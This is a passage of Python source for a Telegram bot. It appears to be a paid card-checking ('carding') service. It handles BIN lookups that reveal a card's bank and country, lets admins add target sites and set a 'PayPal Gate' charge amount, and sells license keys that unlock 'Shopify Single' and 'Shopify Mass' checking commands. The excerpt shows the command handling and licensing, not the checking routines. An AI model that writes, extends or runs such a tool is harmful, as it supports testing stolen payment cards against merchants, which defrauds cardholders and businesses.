            f"<b><i>BIN Info — {bin_num}</i></b>\n"
            f"• Brand: {b_info['brand']}\n"
            f"• Type: {b_info['type']}\n"
            f"• Level: {b_info['level']}\n"
            f"• Bank: {b_info['bank']}\n"
            f"• Country: {b_info['country']} {b_info['flag']}"
        )
        send_message(chat_id, bin_rep)

    elif text.startswith("/f"):
        parts = text.split(" ", 1)
        if len(parts) < 2 and not msg.get("reply_to_message"):
            send_message(chat_id, "<b><i>Usage:</i></b> <code>/f [your message]</code>")
            return
        feedback_content = parts[1] if len(parts) > 1 else "(Image/Media Feedback)"
        for aid in db_get_admins():
            send_message(aid, f"📬 <b>New Feedback from @{uname} ({user_id}):</b>\n\n{feedback_content}")
        send_message(chat_id, f"✅ <b><i>Feedback sent successfully to admin!</i></b> <emoji id='{EMOJI_SUCCESS}'></emoji>")

    elif text.startswith("/addsite"):
        if not is_admin(user_id):
            send_message(chat_id, f"❌ <b><i>Unauthorized.</i></b> <emoji id='{EMOJI_ERROR}'></emoji>")
            return
        parts = text.split(" ", 1)
        if len(parts) < 2:
            send_message(chat_id, "<b><i>Usage:</i></b> <code>/addsite https://site.com</code>")
            return
        new_site = parts[1].strip()
        existing = load_sites()
        if new_site not in existing:
            existing.append(new_site)
            save_sites(existing)
            send_message(chat_id, f"✅ <b><i>Successfully added site. Total sites:</i> {len(existing)}</b> <emoji id='{EMOJI_SUCCESS}'></emoji>")

    elif text.startswith("/sites"):
        if not is_admin(user_id):
            send_message(chat_id, f"❌ <b><i>Unauthorized.</i></b> <emoji id='{EMOJI_ERROR}'></emoji>")
            return
        sites = load_sites()
        send_message(chat_id, f"<b><i>🌐 Loaded Sites in sites.txt:</i></b>\n" + "\n".join([f"• <code>{s}</code>" for s in sites[:20]]))

    elif text.startswith("/setamount"):
        if not is_admin(user_id):
            send_message(chat_id, f"❌ <b><i>Unauthorized.</i></b> <emoji id='{EMOJI_ERROR}'></emoji>")
            return
        parts = text.split(" ", 1)
        if len(parts) < 2:
            send_message(chat_id, f"Current PayPal Amount: <b>${_CONFIG['paypal_amount']}</b>\nUsage: <code>/setamount 10.00</code>")
            return
        try:
            val = float(parts[1].strip())
            _CONFIG["paypal_amount"] = f"{val:.2f}"
            send_message(chat_id, f"✅ <b><i>PayPal Gate Amount updated to:</i> ${_CONFIG['paypal_amount']} USD</b> <emoji id='{EMOJI_SUCCESS}'></emoji>")
        except ValueError:
            send_message(chat_id, f"❌ <b><i>Invalid format.</i></b> <emoji id='{EMOJI_ERROR}'></emoji>")

    elif text.startswith("/genkeys"):
        if not is_admin(user_id):
            send_message(chat_id, f"❌ <b><i>Unauthorized.</i></b> <emoji id='{EMOJI_ERROR}'></emoji>")
            return
        args = text.split()[1:]
        if len(args) < 2:
            send_message(chat_id, "<b><i>Usage:</i></b> <code>/genkeys [count] [days]</code>")
            return
        count, days = int(args[0]), int(args[1])
        keys = db_create_licenses(count, days, user_id)
        
        for key in keys:
            gen_msg = (
                f"<b>🔥 Key Generated Successfully 🔥</b> <emoji id='{EMOJI_SUCCESS}'></emoji>\n"
                "====================================\n"
                f"⏳ <b>Plan →</b> {days} Days\n"
                "✏️ <b>Max Redeems →</b> 100 users\n"
                "====================================\n"
                f"🔑 <b>Your Key:</b>\n"
                f"<code>{key}</code>\n"
                "====================================\n\n"
                "🚀 <b>use /redeem key to activate.</b>"
            )
            send_message(chat_id, gen_msg)

    elif text.startswith("/redeem"):
        args = text.split()[1:]
        if not args:
            send_message(chat_id, "<b><i>Usage:</i></b> <code>/redeem [key]</code>")
            return
        success, res_val = db_redeem_license(args[0].strip(), user_id)
        if success:
            days = res_val
            redeem_response = (
                f"<b>WTB Key Redeemed Successfully! WTB</b> <emoji id='{EMOJI_SUCCESS}'></emoji>\n\n"
                "☑️ <b>Thanks for your purchase!</b>\n"
                f"⭐ <b>Plan: {days} days (75/100 slots left)</b>\n\n"
                "🚀 <b>You now have access to:</b>\n"
                "🔻 <code>/st1</code> — Shopify Single\n"
                "🔻 <code>/mst</code> — Shopify Mass\n"
                "🍸 <b>Enjoy your premium experience!</b>"
            )
            send_message(chat_id, redeem_response)
        else:
            if res_val == "ALREADY_USED":
                fail_msg = (
                    f"<b>🌧️ Key Already Used 🌧️</b> <emoji id='{EMOJI_DEAD}'></emoji>\n"
                    "====================================\n"
                    "❌ <b>This key has already been redeemed by someone else.</b>\n"
                    "📢 <b>Please purchase or get a fresh key.</b>"
                )
                send_message(chat_id, fail_msg)
            else:
                send_message(chat_id, res_val)

def main():
    init_db()
    print("[+] 👑Poriot_ke👑 Multi-Check Bot Online (Python 3.6 Mode)...")
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TG_TOKEN}/getUpdates?offset={offset}&timeout=30"
            res = requests.get(url, timeout=35).json()
            if res.get("ok"):
                for result in res.get("result", []):
                    offset = result["update_id"] + 1
                    t = Thread(target=handle_update, args=(result,))
                    t.start()
        except Exception:
            time.sleep(3)

if __name__ == "__main__":
    main()
